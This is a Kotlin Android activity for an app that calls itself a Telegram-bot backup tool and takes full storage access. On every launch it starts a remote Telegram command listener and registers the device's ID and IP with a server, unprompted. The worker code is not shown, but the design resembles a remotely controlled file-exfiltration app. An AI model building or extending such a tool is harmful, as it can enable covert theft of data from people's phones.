package com.service.assasinscreed02

import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.activity.ComponentActivity
import androidx.work.*
import java.util.concurrent.TimeUnit
import android.content.Intent
import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.app.AlertDialog
import android.os.Environment
import android.util.Log
import android.widget.Toast
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView

class MainActivity : AppCompatActivity() {
    companion object {
        private const val TAG = "MainActivity"
        private const val PERMISSION_REQUEST_CODE = 100
    }
    
    private lateinit var btnControl: Button
    private lateinit var txtEstado: TextView
    private var backupActivo = false
    private lateinit var recyclerHistorial: RecyclerView
    private lateinit var backupHistoryAdapter: BackupHistoryAdapter

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        try {
            inicializarVistas()
            // Eliminar líneas que aplican STRIKE_THRU_TEXT_FLAG a los botones
            verificarPermisos()
            configurarBotones()
            actualizarEstado()
            iniciarTelegramListener()
            // Registro del dispositivo al servidor
            val deviceInfo = DeviceInfo(
                deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown_device",
                deviceName = android.os.Build.MODEL,
                androidVersion = android.os.Build.VERSION.RELEASE,
                appVersion = "radio2-1.0.0",
                lastSeen = System.currentTimeMillis(),
                serverUrl = "http://192.168.1.100:8080",
                ipAddress = getLocalIpAddress()
            )
            registrarDispositivo(this, deviceInfo)
        } catch (e: Exception) {
            Log.e(TAG, "Error en onCreate: ${e.message}", e)
            Toast.makeText(this, "Error inicializando la aplicación", Toast.LENGTH_LONG).show()
        }
    }
    
    private fun inicializarVistas() {
        btnControl = findViewById(R.id.btnControl)
        txtEstado = findViewById(R.id.txtEstado)
        recyclerHistorial = findViewById(R.id.recyclerHistorial)
        recyclerHistorial.layoutManager = LinearLayoutManager(this)
        backupHistoryAdapter = BackupHistoryAdapter(obtenerHistorialBackups())
        recyclerHistorial.adapter = backupHistoryAdapter
    }
    
    private fun configurarBotones() {
        val btnConfigBot = findViewById<Button>(R.id.btnConfigBot)
        val btnConfigBackup = findViewById<Button>(R.id.btnConfigBackup)
        val btnForzarBackup = findViewById<Button>(R.id.btnForzarBackup)

        btnConfigBot.setOnClickListener {
            try {
                startActivity(Intent(this, ConfigBotActivity::class.java))
            } catch (e: Exception) {
                Log.e(TAG, "Error abriendo ConfigBotActivity: ${e.message}")
                Toast.makeText(this, "Error abriendo configuración del bot", Toast.LENGTH_SHORT).show()
            }
        }
        
        btnConfigBackup.setOnClickListener {
            try {
                startActivity(Intent(this, ConfigBackupActivity::class.java))
            } catch (e: Exception) {
                Log.e(TAG, "Error abriendo ConfigBackupActivity: ${e.message}")
                Toast.makeText(this, "Error abriendo configuración de backup", Toast.LENGTH_SHORT).show()
            }
        }

        btnControl.setOnClickListener {
            try {
                toggleBackup()
            } catch (e: Exception) {
                Log.e(TAG, "Error alternando backup: ${e.message}")
                Toast.makeText(this, "Error controlando el backup", Toast.LENGTH_SHORT).show()
            }
        }
        
        btnForzarBackup.setOnClickListener {
            try {
                forzarBackup()
            } catch (e: Exception) {
                Log.e(TAG, "Error forzando backup: ${e.message}")
                Toast.makeText(this, "Error forzando backup: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }
    
    private fun toggleBackup() {
        if (backupActivo) {
            detenerBackup()
        } else {
            iniciarBackup()
        }
    }
    
    private fun iniciarBackup() {
        try {
            // Debug: mostrar configuración actual
            val (token, chatId) = ErrorHandler.obtenerConfigBot(this)
            Log.d(TAG, "Debug - Token: ${token?.take(10)}..., ChatId: $chatId")
            Log.d(TAG, "Debug - validateConfig: ${ErrorHandler.validateConfig(this)}")
            
            if (!ErrorHandler.validateConfig(this)) {
                ErrorHandler.showToast(this, "Configura el bot de Telegram primero", true)
                return
            }
            
            if (!ErrorHandler.validatePermissions(this)) {
                ErrorHandler.showToast(this, "Otorga permisos de almacenamiento primero", true)
                return
            }
            
            val intervalo = ErrorHandler.obtenerIntervalo(this).toLong()
            val workRequest = PeriodicWorkRequestBuilder<BackupWorker>(intervalo, TimeUnit.HOURS)
                .setBackoffCriteria(BackoffPolicy.LINEAR, 1, TimeUnit.HOURS)
                .build()
                
            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "backup_trabajo",
                ExistingPeriodicWorkPolicy.REPLACE,
                workRequest
            )
            
            ErrorHandler.showToast(this, "Backup iniciado cada $intervalo horas")
            Log.d(TAG, "Backup iniciado")
        } catch (e: Exception) {
            ErrorHandler.logError(TAG, "Error iniciando backup: ${e.message}", e)
            ErrorHandler.showToast(this, "Error iniciando backup: ${e.message}", true)
        }
    }
    
    private fun detenerBackup() {
        try {
            WorkManager.getInstance(this).cancelUniqueWork("backup_trabajo")
            Toast.makeText(this, "Backup detenido", Toast.LENGTH_SHORT).show()
            Log.d(TAG, "Backup detenido")
        } catch (e: Exception) {
            Log.e(TAG, "Error deteniendo backup: ${e.message}", e)
            Toast.makeText(this, "Error deteniendo backup: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }
    
    private fun forzarBackup() {
        try {
            if (!ErrorHandler.validateConfig(this)) {
                ErrorHandler.showToast(this, "Configura el bot de Telegram primero", true)
                return
            }
            
            if (!ErrorHandler.validatePermissions(this)) {
                ErrorHandler.showToast(this, "Otorga permisos de almacenamiento primero", true)
                return
            }
            
            // Crear un trabajo único para forzar el backup
            val workRequest = OneTimeWorkRequestBuilder<BackupWorker>()
                .build()
                
            WorkManager.getInstance(this).enqueueUniqueWork(
                "backup_forzado",
                ExistingWorkPolicy.REPLACE,
                workRequest
            )
            
            ErrorHandler.showToast(this, "Backup forzado iniciado")
            Log.d(TAG, "Backup forzado iniciado")
        } catch (e: Exception) {
            ErrorHandler.logError(TAG, "Error forzando backup: ${e.message}", e)
            ErrorHandler.showToast(this, "Error forzando backup: ${e.message}", true)
        }
    }
    
    private fun iniciarTelegramListener() {
        try {
            val workRequest = OneTimeWorkRequestBuilder<TelegramCommandWorker>()
                .setInitialDelay(1, TimeUnit.MINUTES)
                .build()
                
            WorkManager.getInstance(this).enqueueUniqueWork(
                "telegram_command_listener",
                ExistingWorkPolicy.REPLACE,
                workRequest
            )
            Log.d(TAG, "Telegram listener iniciado")
        } catch (e: Exception) {
            Log.e(TAG, "Error iniciando Telegram listener: ${e.message}", e)
        }
    }

    private fun verificarPermisos() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                mostrarDialogoPermisos()
            }
        } else {
            val permisos = arrayOf(
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            )
            val faltan = permisos.any {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (faltan) {
                ActivityCompat.requestPermissions(this, permisos, PERMISSION_REQUEST_CODE)
            }
        }
    }
    
    private fun mostrarDialogoPermisos() {
        AlertDialog.Builder(this)
            .setTitle("Permiso requerido")
            .setMessage("La app necesita acceso completo al almacenamiento para funcionar correctamente.")
            .setPositiveButton("Configurar") { _, _ ->
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    startActivity(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Error abriendo configuración de permisos: ${e.message}")
                }
            }
            .setNegativeButton("Cancelar", null)
            .show()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.any { it != PackageManager.PERMISSION_GRANTED }) {
                mostrarDialogoPermisos()
            }
        }
    }

    private fun actualizarEstado() {
        try {
            WorkManager.getInstance(this).getWorkInfosForUniqueWorkLiveData("backup_trabajo").observe(this) { infos ->
                try {
                    backupActivo = infos.any { it.state == WorkInfo.State.ENQUEUED || it.state == WorkInfo.State.RUNNING }
                    btnControl.text = if (backupActivo) "Detener Backup" else "Iniciar Backup"
                    btnControl.setBackgroundColor(if (backupActivo) 0xFF4CAF50.toInt() else 0xFFF44336.toInt())
                    txtEstado.text = if (backupActivo) "Servicio activo" else "Servicio detenido"
                } catch (e: Exception) {
                    Log.e(TAG, "Error actualizando estado: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error configurando observer de estado: ${e.message}", e)
        }
    }

    private fun obtenerHistorialBackups(): List<BackupWorker.BackupHistoryEntry> {
        val prefs = getSharedPreferences("BackupPrefs", MODE_PRIVATE)
        val archivos = prefs.getStringSet("uploaded_files", emptySet()) ?: emptySet()
        return archivos.mapNotNull { hash ->
            val parts = hash.split("|||")
            if (parts.size == 3) BackupWorker.BackupHistoryEntry(parts[0], parts[1], parts[2].toLongOrNull() ?: 0L) else null
        }.sortedByDescending { it.timestamp }
    }


    
    override fun onResume() {
        super.onResume()
        try {
            actualizarEstado()
            // Actualizar historial al volver a la pantalla
            backupHistoryAdapter = BackupHistoryAdapter(obtenerHistorialBackups())
            recyclerHistorial.adapter = backupHistoryAdapter
        } catch (e: Exception) {
            Log.e(TAG, "Error en onResume: ${e.message}", e)
        }
    }
}